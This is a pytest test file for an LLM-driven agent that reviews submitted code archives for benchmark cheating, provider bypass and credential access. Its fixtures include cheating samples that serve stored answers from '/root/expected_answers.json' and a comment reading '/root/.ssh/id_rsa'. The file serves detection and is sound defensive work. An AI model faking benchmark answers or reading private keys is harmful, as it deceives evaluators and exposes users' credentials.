    assert "provider_limit" not in signature
    assert "sk-test-private-review" not in signature
    assert "miner source" not in signature


@pytest.mark.parametrize(
    ("message", "category"),
    [
        ("Rate limit exceeded: limit_rpm/provider/model per key", "key_rpm"),
        ("Upstream model capacity is overloaded", "upstream_capacity"),
        ("Insufficient credits for this request", "credits"),
    ],
)
def test_provider_error_categories_are_fixed_labels(
    message: str, category: str
) -> None:
    signature = source_review_module._body_signature(
        {"error": {"code": 429, "message": message + " sk-test-private-review"}}
    )
    assert f"provider_limit={category}" in signature
    assert "sk-test-private-review" not in signature
    assert message not in signature


def test_body_signature_never_reads_a_message_beside_model_output() -> None:
    """A body with ``choices`` or ``output`` can quote miner source; skip it."""
    for body_key in ("choices", "output"):
        signature = source_review_module._body_signature(
            {
                body_key: [],
                "error": {"code": 429, "message": "miner source text here"},
            }
        )
        assert "miner source text" not in signature
        assert "provider_limit" not in signature


async def test_non_json_body_parks_after_one_post(tmp_path: Path) -> None:
    """A non-JSON response is failure evidence, not retry authority."""
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    calls = 0

    def handler(_request: httpx.Request) -> httpx.Response:
        nonlocal calls
        calls += 1
        return httpx.Response(
            200,
            text="<html>upstream error</html>",
            headers={"content-type": "text/html"},
        )

    observation = await _agent(key, httpx.MockTransport(handler)).review(
        str(_archive(tmp_path, "fn main() { call_model(); }")),
        artifact_sha256=_SHA,
    )

    assert not observation.ok
    assert observation.error_code == "source-review-jsondecodeerror"
    assert observation.failure_disposition == "retryable_infra"
    assert calls == 1


async def test_http_429_logs_the_provider_limit_without_publishing_it(
    tmp_path: Path, caplog: pytest.LogCaptureFixture
) -> None:
    """A real HTTP 429 names its limit in the logs, never in the public code."""
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    limit = "Rate limit exceeded: limit_rpm/openai/gpt-6-luna per key"

    def handler(request: httpx.Request) -> httpx.Response:
        return httpx.Response(
            429,
            request=request,
            json={"error": {"code": 429, "message": limit}},
        )

    with caplog.at_level(logging.WARNING, logger=source_review_module.__name__):
        observation = await _agent(key, httpx.MockTransport(handler)).review(
            str(_archive(tmp_path, "fn main() { call_model(); }")),
            artifact_sha256=_SHA,
        )

    assert observation.error_code == "source-review-http-429"
    assert limit not in repr(observation)
    retry_lines = [
        record.getMessage()
        for record in caplog.records
        if "retrying same turn" in record.getMessage()
    ]
    park_lines = [
        record.getMessage()
        for record in caplog.records
        if "parking attempt" in record.getMessage()
    ]
    assert retry_lines and park_lines
    for line in retry_lines + park_lines:
        assert "http-status=429 provider_limit=key_rpm" in line
        assert limit not in line


async def test_http_429_parks_after_three_bounded_posts(tmp_path: Path) -> None:
    """A persistent HTTP 429 parks after the fixed same-turn retry grant."""
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    calls = 0

    def handler(request: httpx.Request) -> httpx.Response:
        nonlocal calls
        calls += 1
        return httpx.Response(429, request=request, json={"error": "rate limited"})

    observation = await _agent(key, httpx.MockTransport(handler)).review(
        str(_archive(tmp_path, "fn main() { call_model(); }")),
        artifact_sha256=_SHA,
    )

    assert not observation.ok
    assert observation.error_code == "source-review-http-429"
    assert observation.failure_disposition == "retryable_infra"
    assert calls == 3


def _note_call(
    call_id: str, kind: str, summary: str, **extra: object
) -> dict[str, object]:
    return _tool(call_id, "record_note", {"kind": kind, "summary": summary, **extra})


def test_review_transcript_compaction_keeps_stable_prefix_and_recent_turns() -> None:
    messages: list[dict[str, object]] = [
        {"role": "system", "content": "stable-system"},
        {"role": "user", "content": "stable-inventory"},
    ]
    for turn in range(6):
        messages.extend(
            [
                {
                    "role": "assistant",
                    "content": None,
                    "tool_calls": [_tool(f"read-{turn}", "search", {"query": "x"})],
                },
                {
                    "role": "tool",
                    "tool_call_id": f"read-{turn}",
                    "content": f"large-output-{turn}",
                },
            ]
        )
    notes = [
        {
            "kind": "cleared",
            "area": "served_entrypoint",
            "category": "none",
            "summary": "Entrypoint follows the normal path.",
            "stage": "l1",
        }
    ]

    compacted = source_review_module._compacted_review_messages(messages, notes)

    assert compacted[:2] == messages[:2]
    assert "recorded notes ledger" in str(compacted[2]["content"])
    assert "large-output-0" not in json.dumps(compacted)
    assert "large-output-5" in json.dumps(compacted)
    assert sum(row.get("role") == "assistant" for row in compacted) == 3


@pytest.mark.parametrize("policy_version", [12, 13])
async def test_l1_uses_cached_prefix_adaptive_reasoning_and_coverage_exit(
    tmp_path: Path,
    policy_version: int,
) -> None:
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    seen: list[dict[str, object]] = []
    final = {
        "risk_level": "low",
        "confidence": 0.9,
        "categories": ["none"],
        "evidence": [],
        "summary": "General model-backed request path.",
    }
    final = _with_policy_v10_invariants(final)
    if policy_version == 12:
        final["invariants"] = [
            item
            for item in final["invariants"]
            if item["invariant"] != "i8_evaluation_independence"
        ]
    areas = [
        "served_entrypoint",
        "retrieval",
        "model_call",
        "tool_dispatch",
        "answer_construction",
    ]

    def handler(request: httpx.Request) -> httpx.Response:
        payload = json.loads(request.content)
        seen.append(payload)
        if len(seen) == 1:
            tool_calls = [
                _note_call(
                    f"note-{index}",
                    "cleared",
                    f"{area} follows the normal served path.",
                    area=area,
                )
                for index, area in enumerate(areas)
            ]
            tool_calls.extend(
                [
                    _tool(
                        "read-1",
                        "read_file",
                        {"path": "src/main.rs", "start_line": 1, "end_line": 40},
                    ),
                    _tool("search-1", "search", {"query": "call_model"}),
                ]
            )
        else:
            tool_calls = [_tool("submit-1", "submit_review", final)]
        return httpx.Response(
            200,
            json={
                "choices": [
                    {
                        "message": {
                            "role": "assistant",
                            "content": None,
                            "tool_calls": tool_calls,
                        }
                    }
                ]
            },
        )

    observation = await _agent(key, httpx.MockTransport(handler)).review(
        str(_archive(tmp_path, "fn main() { call_model(); }")),
        artifact_sha256=_SHA,
        policy_version=policy_version,
    )

    assert observation.ok and observation.risk_level == "low"
    assert seen[0]["reasoning"] == {"effort": "medium"}
    assert seen[1]["reasoning"] == {"effort": "high"}
    assert seen[0]["prompt_cache_key"] == seen[1]["prompt_cache_key"]
    assert len(str(seen[0]["prompt_cache_key"])) <= 64
    expected_nudge = (
        "not a completeness certificate"
        if policy_version == 13
        else "notes ledger now covers every served-path area"
    )
    assert any(expected_nudge in str(row.get("content")) for row in seen[1]["messages"])
    assert "BATCH RELATED READS" in str(seen[0]["messages"][0]["content"])


async def test_budget_exhaustion_with_concern_notes_holds_with_evidence(
    tmp_path: Path,
) -> None:
    """A review that dies at its step budget ships its ledger and holds."""
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    calls = 0

    def handler(_request: httpx.Request) -> httpx.Response:
        nonlocal calls
        calls += 1
        tool_calls = (
            [
                _note_call(
                    "note-1",
                    "concern",
                    "Reachable host gate rejects model drafts on derived values.",
                    category="scorer_contract_manipulation",
                    path="src/main.rs",
                    line=7,
                    confidence=0.8,
                ),
                _tool(
                    "read-1",
                    "read_file",
                    {"path": "src/main.rs", "start_line": 1, "end_line": 40},
                ),
            ]
            if calls == 1
            else [
                _tool(
                    "read-" + str(calls),
                    "read_file",
                    {"path": "src/main.rs", "start_line": 1, "end_line": 40},
                )
            ]
        )
        return httpx.Response(
            200,
            json={
                "choices": [
                    {
                        "message": {
                            "role": "assistant",
                            "content": None,
                            "tool_calls": tool_calls,
                        }
                    }
                ]
            },
        )

    observation = await _agent(key, httpx.MockTransport(handler)).review(
        str(_archive(tmp_path, "fn main() { call_model(); }")),
        artifact_sha256=_SHA,
    )

    assert not observation.ok
    assert observation.error_code == "source-review-step-budget-exhausted"
    assert observation.failure_disposition == "inconclusive"
    assert [note["kind"] for note in observation.notes] == ["concern"]
    note = observation.notes[0]
    assert note["category"] == "scorer_contract_manipulation"
    assert note["path"] == "src/main.rs"
    assert note["line"] == 7
    assert note["confidence"] == 0.8


async def test_budget_exhaustion_with_cleared_coverage_admits(
    tmp_path: Path,
) -> None:
    """Zero concerns + enough cleared notes = admission on positive coverage."""
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    calls = 0

    def handler(_request: httpx.Request) -> httpx.Response:
        nonlocal calls
        calls += 1
        if calls == 1:
            tool_calls = [
                _note_call(
                    "n1", "cleared", "Entrypoint routes to a genuine model call."
                ),
                _note_call(
                    "n2", "cleared", "Tool dispatch executes model-authored calls."
                ),
                _note_call("n3", "cleared", "Answer construction forwards model text."),
            ]
        else:
            tool_calls = [
                _tool(
                    "read-" + str(calls),
                    "read_file",
                    {"path": "src/main.rs", "start_line": 1, "end_line": 40},
                )
            ]
        return httpx.Response(
            200,
            json={
                "choices": [
                    {
                        "message": {
                            "role": "assistant",
                            "content": None,
                            "tool_calls": tool_calls,
                        }
                    }
                ]
            },
        )

    observation = await _agent(key, httpx.MockTransport(handler)).review(
        str(_archive(tmp_path, "fn main() { call_model(); }")),
        artifact_sha256=_SHA,
    )

    assert not observation.ok
    assert observation.failure_disposition == "pass_inconclusive"
    assert len(observation.notes) == 3


async def test_budget_exhaustion_with_thin_ledger_still_holds(
    tmp_path: Path,
) -> None:
    """No concerns but too little positive coverage cannot silently admit."""
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)

    def handler(_request: httpx.Request) -> httpx.Response:
        return httpx.Response(
            200,
            json={
                "choices": [
                    {
                        "message": {
                            "role": "assistant",
                            "content": None,
                            "tool_calls": [
                                _tool(
                                    "read-1",
                                    "read_file",
                                    {
                                        "path": "src/main.rs",
                                        "start_line": 1,
                                        "end_line": 40,
                                    },
                                )
                            ],
                        }
                    }
                ]
            },
        )

    observation = await _agent(key, httpx.MockTransport(handler)).review(
        str(_archive(tmp_path, "fn main() {}")),
        artifact_sha256=_SHA,
    )

    assert not observation.ok
    assert observation.failure_disposition == "inconclusive"
    assert observation.notes == ()


async def test_completion_budget_fits_a_whole_policy_v10_sweep(
    tmp_path: Path,
) -> None:
    """The verdict turn is not truncated at the historical 2200-token cap.

    A cut-off ``submit_review`` argument string used to die on
    ``JSONDecodeError`` and burn the whole attempt as infrastructure, so the
    budget the request carries is a correctness property, not a tuning knob.
    """
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    seen: list[dict[str, object]] = []
    transport = _transport(_BENIGN_REVIEW, seen)

    observation = await _agent(key, transport).review(
        str(_archive(tmp_path, "fn main() {}")),
        artifact_sha256=_SHA,
    )

    assert observation.ok
    assert seen
    assert all(request["max_completion_tokens"] == 8_000 for request in seen)


async def test_completion_budget_is_operator_settable(tmp_path: Path) -> None:
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    seen: list[dict[str, object]] = []
    agent = OpenRouterSourceReviewAgent(
        api_key_file=str(key),
        model="openai/gpt-5.6-luna",
        base_url="https://openrouter.test/api/v1",
        timeout_seconds=10,
        max_steps=4,
        max_completion_tokens=12_000,
        transport=_transport(_BENIGN_REVIEW, seen),
    )

    observation = await agent.review(
        str(_archive(tmp_path, "fn main() {}")),
        artifact_sha256=_SHA,
    )

    assert observation.ok
    assert all(request["max_completion_tokens"] == 12_000 for request in seen)


async def test_completion_budget_cannot_be_set_below_one_sweep(
    tmp_path: Path,
) -> None:
    """A floor keeps a misconfiguration from re-creating the truncation bug."""
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    seen: list[dict[str, object]] = []
    agent = OpenRouterSourceReviewAgent(
        api_key_file=str(key),
        model="openai/gpt-5.6-luna",
        base_url="https://openrouter.test/api/v1",
        timeout_seconds=10,
        max_steps=4,
        max_completion_tokens=64,
        transport=_transport(_BENIGN_REVIEW, seen),
    )

    await agent.review(
        str(_archive(tmp_path, "fn main() {}")),
        artifact_sha256=_SHA,
    )

    assert all(request["max_completion_tokens"] == 2_000 for request in seen)


def test_a_hold_threshold_above_one_is_not_inert() -> None:
    """The old form held on 1..N-1 concerns, so raising N changed nothing."""
    notes = [
        {"kind": "concern", "category": "credential_access", "path": "a.rs", "line": 3},
        {"kind": "cleared", "category": "none", "path": "b.rs", "line": 1},
        {"kind": "cleared", "category": "none", "path": "c.rs", "line": 1},
        {"kind": "cleared", "category": "none", "path": "d.rs", "line": 1},
    ]

    assert (
        ledger_disposition(notes, concern_hold_count=1, clear_min_notes=3)
        == "inconclusive"
    )
    assert (
        ledger_disposition(notes, concern_hold_count=3, clear_min_notes=3)
        == "pass_inconclusive"
    )


def test_full_concern_ledger_keeps_new_source_location() -> None:
    template: dict[str, object] = {
        "kind": "concern",
        "category": "benchmark_emulation",
        "path": "app/service.py",
        "line": 85,
    }
    cap = source_review_module._MAX_REVIEW_NOTES
    notes = [template.copy() for _ in range(cap)]
    tool_gate = {
        "kind": "concern",
        "category": "mandatory_contract_failure",
        "path": "app/service.py",
        "line": 355,
    }

    assert source_review_module._append_note(notes, tool_gate)

    assert len(notes) == cap
    assert notes[-1] is tool_gate
    assert notes[0]["line"] == 85

    distinct = [{**template, "line": line} for line in range(1, cap + 1)]
    assert not source_review_module._append_note(distinct, tool_gate)
    assert len(distinct) == cap
    assert tool_gate not in distinct


def test_repeated_concern_feedback_reports_storage_and_new_evidence_guidance() -> None:
    concern = {
        "kind": "concern",
        "category": "benchmark_emulation",
        "path": "app/service.py",
        "line": 65,
    }
    notes = [concern.copy() for _ in range(source_review_module._MAX_REVIEW_NOTES)]

    feedback = source_review_module._record_note_feedback(notes, concern.copy())

    assert feedback["recorded"] is False
    assert feedback["notes"] == source_review_module._MAX_REVIEW_NOTES
    assert feedback["same_site_concerns"] == source_review_module._MAX_REVIEW_NOTES
    assert "submit_review using the existing ledger" in str(feedback["guidance"])
    assert (
        source_review_module._record_note_feedback(
            notes, {**concern, "category": "mandatory_contract_failure", "line": 355}
        )["recorded"]
        is True
    )
    assert notes[-1]["line"] == 355


def test_repeated_site_feedback_keeps_distinct_mechanisms_in_the_ledger() -> None:
    site = {
        "kind": "concern",
        "category": "benchmark_emulation",
        "path": "app/service.py",
        "line": 65,
    }
    notes = [{**site, "summary": f"mechanism {index}"} for index in range(3)]

    feedback = source_review_module._record_note_feedback(
        notes, {**site, "summary": "a separate effect at the same source line"}
    )

    assert feedback["recorded"] is True
    assert feedback["same_site_concerns"] == 4
    assert "distinct causal mechanism" in str(feedback["guidance"])
    assert len(notes) == 4
    assert notes[-1]["summary"] == "a separate effect at the same source line"


async def test_dropped_repeated_note_keeps_the_inspection_reminder(
    tmp_path: Path,
) -> None:
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    seen: list[dict[str, object]] = []
    final = _with_policy_v10_invariants(_BENIGN_REVIEW)

    def handler(request: httpx.Request) -> httpx.Response:
        seen.append(json.loads(request.content))
        if len(seen) == 1:
            tool_calls = [
                _note_call(
                    f"note-{index}",
                    "concern",
                    "Repeated source concern.",
                    category="benchmark_emulation",
                    area="answer_construction",
                    path="src/main.rs",
                    line=1,
                )
                for index in range(source_review_module._MAX_REVIEW_NOTES)
            ]
            tool_calls.extend(
                _tool(
                    f"read-{index}",
                    "read_file",
                    {"path": "src/main.rs", "start_line": 1, "end_line": 1},
                )
                for index in range(source_review_module._NOTELESS_NUDGE_EVERY)
            )
            tool_calls.append(
                _note_call(
                    "dropped-duplicate",
                    "concern",
                    "Repeated source concern.",
                    category="benchmark_emulation",
                    area="answer_construction",
                    path="src/main.rs",
                    line=1,
                )
            )
        else:
            tool_calls = [_tool("submit", "submit_review", final)]
        return httpx.Response(
            200,
            json={
                "choices": [
                    {
                        "message": {
                            "role": "assistant",
                            "content": None,
                            "tool_calls": tool_calls,
                        }
                    }
                ]
            },
        )

    await _agent(key, httpx.MockTransport(handler)).review(
        str(_archive(tmp_path, "fn main() { call_model(); }")),
        artifact_sha256=_SHA,
        policy_version=10,
    )

    assert len(seen) >= 2
    messages = seen[1]["messages"]
    assert any(source_review_module._NOTE_NUDGE in str(row) for row in messages)
    assert any('"recorded": false' in str(row) for row in messages)


def test_single_site_multi_location_concerns_cannot_hold() -> None:
    """A one-site benchmark_emulation note could never become a finding.

    The finding contract needs two distinct locations for that category, so
    counting a single-site note toward a hold holds on evidence that would
    have been rejected as a verdict.
    """
    notes = [
        {
            "kind": "concern",
            "category": "benchmark_emulation",
            "path": "src/main.rs",
            "line": 10,
        },
        {
            "kind": "concern",
            "category": "scorer_contract_manipulation",
            "path": "src/score.rs",
            "line": 20,
        },
        {"kind": "cleared", "category": "none", "path": "b.rs", "line": 1},
        {"kind": "cleared", "category": "none", "path": "c.rs", "line": 1},
        {"kind": "cleared", "category": "none", "path": "d.rs", "line": 1},
    ]

    assert substantiated_concern_count(notes) == 0
    assert (
        ledger_disposition(notes, concern_hold_count=3, clear_min_notes=3)
        == "pass_inconclusive"
    )


def test_two_sites_substantiate_a_multi_location_concern() -> None:
    notes = [
        {
            "kind": "concern",
            "category": "benchmark_emulation",
            "path": "src/main.rs",
            "line": 10,
        },
        {
            "kind": "concern",
            "category": "benchmark_emulation",
            "path": "src/table.rs",
            "line": 44,
        },
        {
            "kind": "concern",
            "category": "benchmark_emulation",
            "path": "src/table.rs",
            "line": 51,
        },
        {"kind": "cleared", "category": "none", "path": "b.rs", "line": 1},
        {"kind": "cleared", "category": "none", "path": "c.rs", "line": 1},
        {"kind": "cleared", "category": "none", "path": "d.rs", "line": 1},
    ]

    assert substantiated_concern_count(notes) == 3
    assert (
        ledger_disposition(notes, concern_hold_count=3, clear_min_notes=3)
        == "inconclusive"
    )


def test_repeated_citation_of_one_line_is_one_concern() -> None:
    notes = [
        {"kind": "concern", "category": "provider_bypass", "path": "a.rs", "line": 7},
        {"kind": "concern", "category": "provider_bypass", "path": "a.rs", "line": 7},
        {"kind": "concern", "category": "provider_bypass", "path": "a.rs", "line": 7},
        {"kind": "cleared", "category": "none", "path": "b.rs", "line": 1},
        {"kind": "cleared", "category": "none", "path": "c.rs", "line": 1},
        {"kind": "cleared", "category": "none", "path": "d.rs", "line": 1},
    ]

    assert substantiated_concern_count(notes) == 1
    assert (
        ledger_disposition(notes, concern_hold_count=3, clear_min_notes=3)
        == "pass_inconclusive"
    )


def test_thin_clean_ledger_still_holds() -> None:
    """No concerns is not the same as enough positive coverage to admit."""
    notes = [{"kind": "cleared", "category": "none", "path": "b.rs", "line": 1}]

    assert (
        ledger_disposition(notes, concern_hold_count=3, clear_min_notes=3)
        == "inconclusive"
    )
    assert ledger_disposition([], concern_hold_count=3, clear_min_notes=3) == (
        "inconclusive"
    )


def _high_risk_review(path: str, lines: tuple[int, ...]) -> dict[str, object]:
    return _with_policy_v10_invariants(
        {
            "risk_level": "high",
            "confidence": 0.97,
            "categories": ["benchmark_emulation"],
            "evidence": [
                {"path": path, "line": line, "category": "benchmark_emulation"}
                for line in lines
            ],
            "summary": "Served path returns stored answers instead of a model result.",
        }
    )


def _production_engine_decision(observation: object) -> dict[str, object]:
    finding = getattr(observation, "finding", None)
    assert isinstance(finding, dict)
    decisions = finding["invariant_assessment"]["decisions"]
    return next(
        decision
        for decision in decisions
        if decision["invariant"] == SourceReviewInvariant.PRODUCTION_ENGINE.value
    )


def test_python_high_risk_finding_after_single_quoted_glob_stays_high(
    tmp_path: Path,
) -> None:
    """A Python `'data/*.json'` must not blank the code it precedes.

    The C lexer read the `/*` as a block comment that never closed, so every
    citation below it became "comment-or-blank", the finding was demoted to
    low, and its BREACH was rewritten to PASS/UNREACHABLE_NONRUNTIME_CODE.
    """
    agent = (
        "import glob\n"
        "FIXTURES = glob.glob('data/*.json')\n"
        "def answer(case_id):\n"
        "    return open('/root/expected_answers.json').read()  # stored\n"
    )
    repo = TarSourceRepository(
        str(
            _archive_files(
                tmp_path,
                {
                    "Dockerfile": b'FROM python:3.12\nCMD ["python", "src/agent.py"]\n',
                    "src/agent.py": agent.encode(),
                },
            )
        )
    )

    observation = source_review_module._parse_review(
        _high_risk_review("src/agent.py", (3, 4)),
        artifact_sha256=_SHA,
        repository=repo,
    )

    assert observation.risk_level == "high"
    assert observation.categories == ("benchmark_emulation",)
    decision = _production_engine_decision(observation)
    assert decision["disposition"] == SourceReviewInvariantDisposition.BREACH.value
    assert decision["pass_clause"] is None


_SERVE_SCRIPT = b"#!/bin/sh\n# serve the stored answers\nexec cat /root/answers.json\n"


def test_runtime_script_under_tests_dir_keeps_its_citation(tmp_path: Path) -> None:
    """A script the Dockerfile runs is runtime code whatever its directory."""
    repo = TarSourceRepository(
        str(
            _archive_files(
                tmp_path,
                {
                    "Dockerfile": (
                        b"FROM alpine\nCOPY tests/serve.sh /serve.sh\n"
                        b'ENTRYPOINT ["/serve.sh"]\n'
                    ),
                    "tests/serve.sh": _SERVE_SCRIPT,
                    "tests/fixture.sh": _SERVE_SCRIPT,
                },
            )
        )
    )
    assert "tests/serve.sh" in repo.runtime_paths()
    assert "tests/fixture.sh" not in repo.runtime_paths()

    served = source_review_module._parse_review(
        _high_risk_review("tests/serve.sh", (2, 3)),
        artifact_sha256=_SHA,
        repository=repo,
    )
    unreferenced = source_review_module._parse_review(
        _high_risk_review("tests/fixture.sh", (2, 3)),
        artifact_sha256=_SHA,
        repository=repo,
    )

    assert served.risk_level == "high"
    # The shell comment is still prose; only the command is evidence.
    assert [item["line"] for item in served.finding["evidence"]] == [3]
    assert unreferenced.risk_level == "low"
    assert unreferenced.categories == ("none",)


@pytest.mark.parametrize(
    ("path", "prefix"),
    [("Sources/a.swift", "// "), ("src/app.rb", "# "), ("src/main.zig", "// ")],
)
def test_a_category_comparison_in_a_comment_is_not_a_dead_guard(
    tmp_path: Path, path: str, prefix: str
) -> None:
    """Swift and Ruby have no lexer; the comment line still is not a branch."""
    guard = 'if category.contains("proal-reas") { return answer; }\n'

    def guards(source: str) -> list[object]:
        repo = TarSourceRepository(
            str(_archive_files(tmp_path, {path: source.encode()}))
        )
        report = repo.review_leads()["unmatchable_category_guards"]
        assert isinstance(report, dict)
        return list(report["guards"])

    assert guards(prefix + guard) == []
    assert len(guards(guard)) == 1


@pytest.mark.parametrize("mode", ["off", "shadow", "enforce"])
def test_a_swift_comment_raises_no_pre_build_finding(tmp_path: Path, mode: str) -> None:
    """The maintainer's line: every role cited the inline comment.

    It raised a high-risk, confidence-1.0 finding in every mode, and shadow
    and enforce also held the attempt for serial review.
    """
    repo = TarSourceRepository(
        str(
            _archive_files(
                tmp_path,
                {"Sources/main.swift": b'fn main() {} // read("/root/.ssh/id_rsa")\n'},
            )
        )
    )
    audit: list[dict[str, object]] = []

    observation = repo.malicious_preflight(
        artifact_sha256="a" * 64, mode=mode, audit_recorder=audit.append
    )

    assert observation is None
    assert all(record["legacy_requires_serial_review"] is False for record in audit)


def test_served_rust_after_a_braceless_cfg_test_module_stays_high(
    tmp_path: Path,
) -> None:
    """``#[cfg(test)] mod tests;`` gates only that declaration.

    The admissibility scan kept counting braces past its ``;``, so the served
    function below was "cfg-test-only", every citation was dropped, and the
    finding was demoted to low with its BREACH rewritten.
    """
    library = (
        "#[cfg(test)]\n"
        "mod tests;\n"
        "\n"
        "pub fn answer(case_id: &str) -> String {\n"
        '    std::fs::read_to_string("/root/expected_answers.json").unwrap()\n'
        "}\n"
    )
    repo = TarSourceRepository(
        str(_archive_files(tmp_path, {"src/lib.rs": library.encode()}))
    )

    observation = source_review_module._parse_review(
        _high_risk_review("src/lib.rs", (4, 5)),
        artifact_sha256=_SHA,
        repository=repo,
    )

    assert observation.risk_level == "high"
    assert observation.categories == ("benchmark_emulation",)
    decision = _production_engine_decision(observation)
    assert decision["disposition"] == SourceReviewInvariantDisposition.BREACH.value


def test_parse_review_resolves_runtime_paths_only_for_test_directory_citations(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The runtime-path walk reopens the archive for every Rust member.

    Its cost grows quadratically with the member count (minutes for a few
    thousand files), and only a tests/ or benches/ citation needs it.
    """
    agent = (
        "def answer(case_id):\n    return open('/root/expected_answers.json').read()\n"
    )
    repo = TarSourceRepository(
        str(_archive_files(tmp_path, {"src/agent.py": agent.encode()}))
    )

    def unexpected(_repository: TarSourceRepository) -> frozenset[str]:
        raise AssertionError("runtime paths resolved for a src/ citation")

    monkeypatch.setattr(TarSourceRepository, "_explicit_runtime_paths", unexpected)

    observation = source_review_module._parse_review(
        _high_risk_review("src/agent.py", (1, 2)),
        artifact_sha256=_SHA,
        repository=repo,
    )

    assert observation.risk_level == "high"
